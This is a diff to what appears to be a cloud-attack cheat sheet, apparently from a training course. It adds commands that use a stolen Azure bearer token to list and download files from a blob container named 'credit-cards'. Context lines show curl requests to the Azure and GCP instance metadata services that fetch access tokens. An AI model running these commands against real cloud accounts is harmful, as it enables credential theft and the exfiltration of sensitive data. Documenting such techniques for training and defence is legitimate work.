@@ -45,6 +45,12 @@ $ aws s3api list-buckets
 
 ##### Azure 
 - JWT for accessing the storage service ```curl "http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true"```
+- Azure authentication using stolen credentials
+```
+export BEARER_TOKEN=eyJ0eXAiOiJKV1iJSUzI1.eyJhdWQiOiJodHRwczovL6nF.9GBdAVCbC...d4EjV2m_ADfn7g9BoDsK9ID-18fvQKuQ
+curl -s -H "Authorization: Bearer $BEARER_TOKEN" -H "x-ms-version:2017-11-09" "https://sec510.blob.core.windows.net/credit-cards?restype=container&comp=list"
+curl -s -H "Authorization: Bearer $BEARER_TOKEN" -H "x-ms-version:2017-11-09" "https://sec510.blob.core.windows.net/creditcards/alice.txt" --output /tmp/alice.txt
+```
 
 ##### GCP
 - Get network security group ```curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/machine-type```
